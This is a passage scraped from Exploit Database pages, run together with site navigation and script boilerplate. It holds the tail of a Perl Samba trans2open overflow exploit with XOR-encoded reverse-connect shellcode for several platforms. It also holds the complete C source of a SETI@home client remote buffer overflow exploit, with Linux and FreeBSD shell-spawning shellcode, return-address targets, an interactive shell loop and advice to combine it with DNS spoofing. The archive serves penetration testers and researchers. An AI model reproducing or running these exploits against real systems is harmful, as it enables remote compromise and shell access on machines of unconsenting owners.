hsj"\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x58\x83\xc0\x1b\x8d\xa0\x01"."\xfc\xff\xff\x83\xe4\xfc\x8b\xec\x33\xc9\x66\xb9\x99\x01\x80\x30"."\x93\x40\xe2\xfa".# reverse-connect, mangled lamagra code + fixes"\x1a\x76\xa2\x41\x21\xf5\x1a\x43\xa2\x5a\x1a\x58\xd0\x1a\xce\x6b"."\xd0\x1a\xce\x67\xd8\x1a\xde\x6f\x1e\xde\x67\x5e\x13\xa2\x5a\x1a"."\xd6\x67\xd0\xf5\x1a\xce\x7f\xf5\x54\xd6\x7d".$p1.$p2 ."\x54\xd6\x63". $a1.$a2.$a3.$a4."\x1e\xd6\x7f\x1a\xd6\x6b\x55\xd6\x6f\x83\x1a\x43\xd0\x1e\xde\x67"."\x5e\x13\xa2\x5a\x03\x18\xce\x67\xa2\x53\xbe\x52\x6c\x6c\x6c\x5e"."\x13\xd2\xa2\x41\x12\x79\x6e\x6c\x6c\x6c\xaa\x42\xe6\x79\x78\x8b"."\xcd\x1a\xe6\x9b\xa2\x53\x1b\xd5\x94\x1a\xd6\x9f\x23\x98\x1a\x60"."\x1e\xde\x9b\x1e\xc6\x9f\x5e\x13\x7b\x70\x6c\x6c\x6c\xbc\xf1\xfa"."\xfd\xbc\xe0\xfb".GetNops(87).($RetAddr x 8)."DDI!". ("\x00" x 277);return $exploit;}sub CreateBuffer_solx86 {my ($Host, $Port, $Return) = @_;my $RetAddr =  eval($Return);my $IckAddr = $RetAddr - 512;$RetAddr = pack("l", $RetAddr);$IckAddr = pack("l", $IckAddr);# IckAddr needs to point to a writable piece of memorymy ($a1, $a2, $a3, $a4) = split(//, gethostbyname($Host));$a1 = chr(ord($a1) ^ 0x93);$a2 = chr(ord($a2) ^ 0x93);$a3 = chr(ord($a3) ^ 0x93);$a4 = chr(ord($a4) ^ 0x93);my ($p1, $p2) = split(//, reverse(pack("s", $Port)));$p1 = chr(ord($p1) ^ 0x93);$p2 = chr(ord($p2) ^ 0x93);my $exploit =# trigger the trans2open overflow"\x00\x04\x08\x20\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x00\x00\x00"."\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"."\x64\x00\x00\x00\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00"."\x00\x00\x00\x00\x00\x00\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01"."\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"."\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90".GetNops(813) .# xor decoder courtesy of hsj"\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x58\x83\xc0\x1b\x8d\xa0\x01"."\xfc\xff\xff\x83\xe4\xfc\x8b\xec\x33\xc9\x66\xb9\x99\x01\x80\x30"."\x93\x40\xe2\xfa".# reverse-connect, code by bighawk"\x2b\x6c\x6b\x6c\xaf\x64\x43\xc3\xa2\x53\x23\x09\xc3\x1a\x76\xa2"."\x5a\xc2\xd2\xd2\xc2\xc2\x23\x75\x6c\x46\xa2\x41\x1a\x54\xfb".$a1.$a2.$a3.$a4 ."\xf5\xfb". $p1.$p2."\xf5\xc2\x1a\x75\xf9\x83\xc5\xc4\x23\x78\x6c\x46\xa2\x41\x21\x9a"."\xc2\xc1\xc4\x23\xad\x6c\x46\xda\xea\x61\xc3\xfb\xbc\xbc\xe0\xfb"."\xfb\xbc\xf1\xfa\xfd\x1a\x70\xc3\xc0\x1a\x71\xc3\xc1\xc0\x23\xa8"."\x6c\x46".GetNops(87) ."010101".$RetAddr.$IckAddr.$RetAddr.$IckAddr."101010"."DDI!". ("\x00" x 277);return $exploit;}sub CreateBuffer_bsdx86 {my ($Host, $Port, $Return) = @_;my $RetAddr =  eval($Return);my $IckAddr = $RetAddr - 512;$RetAddr = pack("l", $RetAddr);$IckAddr = pack("l", $IckAddr);# IckAddr needs to point to a writable piece of memorymy ($a1, $a2, $a3, $a4) = split(//, gethostbyname($Host));$a1 = chr(ord($a1) ^ 0x93);$a2 = chr(ord($a2) ^ 0x93);$a3 = chr(ord($a3) ^ 0x93);$a4 = chr(ord($a4) ^ 0x93);my ($p1, $p2) = split(//, reverse(pack("s", $Port)));$p1 = chr(ord($p1) ^ 0x93);$p2 = chr(ord($p2) ^ 0x93);my $exploit =# trigger the trans2open overflow"\x00\x04\x08\x20\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x00\x00\x00"."\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"."\x64\x00\x00\x00\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00"."\x00\x00\x00\x00\x00\x00\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01"."\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"."\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90".GetNops(830) .# xor decoder courtesy of hsj"\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x58\x83\xc0\x1b\x8d\xa0\x01"."\xfc\xff\xff\x83\xe4\xfc\x8b\xec\x33\xc9\x66\xb9\x99\x01\x80\x30"."\x93\x40\xe2\xfa".# reverse-connect, code by bighawk"\xa2\x5a\x64\x72\xc2\xd2\xc2\xd2\xc2\xc2\x23\xf2\x5e\x13\x1a\x50"."\xfb". $a1.$a2.$a3.$a4 ."\xf5\xfb". $p1.$p2."\xf5\xc2\x1a\x75\x21\x83\xc1\xc5\xc3\xc3\x23\xf1\x5e\x13\xd2\x23"."\xc9\xda\xc2\xc0\xc0\x5e\x13\xd2\x71\x66\xc2\xfb\xbc\xbc\xe0\xfb"."\xfb\xbc\xf1\xfa\xfd\x1a\x70\xc2\xc7\xc0\xc0\x23\xa8\x5e\x13".GetNops(87) ."010101".$RetAddr.$IckAddr.$RetAddr.$IckAddr."101010"."DDI!". ("\x00" x 277);return $exploit;}sub Unblock {my $fd = shift;my $flags;$flags = fcntl($fd,F_GETFL,0) || die "Can't get flags for file handle: $!\n";fcntl($fd, F_SETFL, $flags|O_NONBLOCK) || die "Can't make handle nonblocking: $!\n";}sub GoAway {exit(0);}sub ReadResponse {my ($s) = @_;my $sel = IO::Select->new($s);my $res;my @fds = $sel->can_read(4);foreach (@fds) { $res .= <$s>; }return $res;}sub HexDump {my ($data) = @_;my @x = split(//, $data);my $cnt = 0;foreach my $h (@x){if ($cnt > 16){print "\n";$cnt = 0;}printf("\\x%.2x", ord($h));$cnt++;}print "\n";}# thank you k2 ;)sub GetNops {my ($cnt) = @_;my @nops = split(//,"\x99\x96\x97\x95\x93\x91\x90\x4d\x48\x47\x4f\x40\x41\x37\x3f\x97"."\x46\x4e\xf8\x92\xfc\x98\x27\x2f\x9f\xf9\x4a\x44\x42\x43\x49\x4b"."\xf5\x45\x4c");return join ("", @nops[ map { rand @nops } ( 1 .. $cnt )]);}# milw0rm.com [2003-04-07]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 8
SETI@home Clients - Remote Buffer Overflow - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDSETI@home Clients - Remote Buffer OverflowEDB-ID:8CVE:2003-1118EDB Verified:Author:zillionType:remoteExploit:/Platform:LinuxDate:2003-04-08Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*Seti@Home exploit by zillion[at]safemode.org (2003/01/07)Credits for the vulnerability go to: SkyLined <SkyLined@edup.tudelft.nl>http://spoor12.edup.tudelft.nl/SkyLined%20v4.2/?Advisories/Seti@homeUse this exploit in combination with a DNS spoofing utility such as the oneprovided in the Dsniff package. http://naughty.monkey.org/~dugsong/dsniff/*/#include <unistd.h>#include <sys/stat.h>#include <string.h>#include <sys/socket.h>#include <netinet/in.h>#include <errno.h>#include <stdio.h>#define NOP 0x41#define EXEC "TERM=xterm; export TERM=xterm;exec /bin/sh -i"#define EXEC2 "id;uname -a;"char linux_shellcode[] =/* dup */"\x31\xc9\x31\xc0\x31\xdb\xb3\x04\xb0\x3f\xcd\x80\xfe\xc1\xb0""\x3f\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80"/* execve /bin/sh */"\x31\xdb\x31\xc9\xf7\xe3\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f""\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";char freebsd_shellcode[] ="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb1\x03\xbb\xff\xff\xff\xff""\xb2\x04\x43\x53\x52\xb0\x5a\x50\xcd\x80\x80\xe9\x01\x75\xf3""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f""\x62\x69\x6e\x89\xe3\x50\x53\x50\x54\x53""\xb0\x3b\x50\xcd\x80";char static_crap[] ="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";struct target{int   num;char *description;char *versions;char *type;char *shellcode;long  retaddress;int   bufsize;int   offset;int   junk;};struct target targets[] ={{0,  "Linux  2.2.* ", "3.03.i386      linux-gnu-gnulibc2.1 ", "Packet retr mode", linux_shellcode,0xbffff420, 520, 500, 0},{1,  "Linux  2.4.* ", "3.03 i386/i686 linux-gnu-gnulibc2.1 ", "Packet retr mode", linux_shellcode,0xbffff390, 520, 500, 1},{2,  "Linux  2.*   ", "3.03.i386/i686 linux-gnulibc1-static", "Packet retr mode", linux_shellcode,0xbffff448, 520, 500, 1},{3,  "All above    ", "3.03.i386      linux*               ", "Packet retr mode", linux_shellcode,0xbffff448, 520, 300, 1},{4,  "FreeBSD      ", "3.03.i386      FreeBSD-2.2.8        ", "Packet retr mode", freebsd_shellcode,0x0004956c, 520, 1, 2},{5, NULL, NULL, NULL, NULL, 0, 0, 0}};int open_socket(int port){int sock,fd;struct sockaddr_in cliAddr, servAddr;sock = socket(AF_INET, SOCK_STREAM, 0);if(sock<0) {printf("Error: Cannot open socket \n");exit(1);}/* bind server port */servAddr.sin_family = AF_INET;servAddr.sin_addr.s_addr = htonl(INADDR_ANY);servAddr.sin_port = htons(port);if(bind(sock, (struct sockaddr *) &servAddr, sizeof(servAddr))<0) {printf("Error: Cannot bind to port %d \n",port);exit(1);}listen(sock,5);fd=accept(sock,0,0);return fd;}void usage(char *progname) {int i;printf("\n---------------------------------------------------");printf("\n  *- Seti@Home remote exploit by zillion (s-m0de) -*");printf("\n---------------------------------------------------");printf("\n\nDefault      : %s  -h <target host>",progname);printf("\nTarget       : %s  -t <number>",progname);printf("\nOffset       : %s  -o <offset>",progname);printf("\nPort         : %s  -p <port>\n",progname);printf("\nDebug        : %s  -d \n",progname);printf("\nAvailable types:\n");printf("---------------------------------------------------\n");for(i = 0; targets[i].description; i++) {fprintf(stdout, "%d\t%s\t%s\t%s\n", targets[i].num, targets[i].description,targets[i].versions,targets[i].type);}printf("\n\n");exit(0);}int sh(int sockfd) {char snd[1024], rcv[1024];fd_set rset;int maxfd, n,test;strcpy(snd, EXEC "\n");write(sockfd, snd, strlen(snd));read(sockfd,rcv,7);fflush(stdout);strcpy(snd, EXEC2 "\n");write(sockfd, snd, strlen(snd));/* Main command loop */for (;;) {FD_SET(fileno(stdin), &rset);FD_SET(sockfd, &rset);maxfd = ( ( fileno(stdin) > sockfd )?fileno(stdin):sockfd ) + 1;select(maxfd, &rset, NULL, NULL, NULL);if (FD_ISSET(fileno(stdin), &rset)) {bzero(snd, sizeof(snd));fgets(snd, sizeof(snd)-2, stdin);write(sockfd, snd, strlen(snd));}if (FD_ISSET(sockfd, &rset)) {bzero(rcv, sizeof(rcv));if ((n = read(sockfd, rcv, sizeof(rcv))) == 0) {/* exit */return 0;}if (n < 0) {perror("read");return 1;}fputs(rcv, stdout);fflush(stdout);}} /* for(;;) */}int main(int argc, char **argv){char *buffer,*tmp;long retaddress;char rcv[200];int fd,i,arg,debug=0,type=0,port=80,offset=250;if(argc < 2) { usage(argv[0]); }while ((arg = getopt (argc, argv, "dh:o:l:p:t:")) != -1){switch (arg){case 'd':debug = 1;break;case 'o':offset = atoi(optarg);break;case 'p':port = atoi(optarg);break;case 't':type = atoi(optarg);break;default :usage(argv[0]);}}if((targets[type].retaddress) != 0) {buffer = (char *)malloc((targets[type].bufsize));/* some junk may be required to counter buffer manipulation */if(targets[type].junk == 1) {tmp = (char *)malloc(strlen(static_crap) + strlen(targets[type].shellcode));strcpy(tmp,targets[type].shellcode);strcat(tmp,static_crap);targets[type].shellcode = tmp;}memset(buffer,NOP,targets[type].bufsize);memcpy(buffer + (targets[type].bufsize) - (strlen(targets[type].shellcode) + 8) ,targets[type].shellcode,strlen(targets[type].shellcode));/* Overwrite EBP and EIP */*(long *)&buffer[(targets[type].bufsize) - 8]  = (targets[type].retaddress - targets[type].offset);// If freebsd we need to place a value without 00 in ebpif(type == 4) {*(long *)&buffer[(targets[type].bufsize) - 8]  = 0xbfbff654;}*(long *)&buffer[(targets[type].bufsize) - 4]  = (targets[type].retaddress - targets[type].offset);/* Uncomment to overwrite eip and ebp with 41414141 */if(debug == 1) {*(long *)&buffer[(targets[type].bufsize) - 8]  = 0x41414141;*(long *)&buffer[(targets[type].bufsize) - 4]  = 0x41414141;}}fd = open_socket(port);write(fd,buffer,strlen(buffer));write(fd,"\n",1);write(fd,"\n",1);sleep(1);sh(fd);close(fd);return 0;}// milw0rm.com [2003-04-08]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 9
Apache 2.x - Memory Leak - Windows dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout 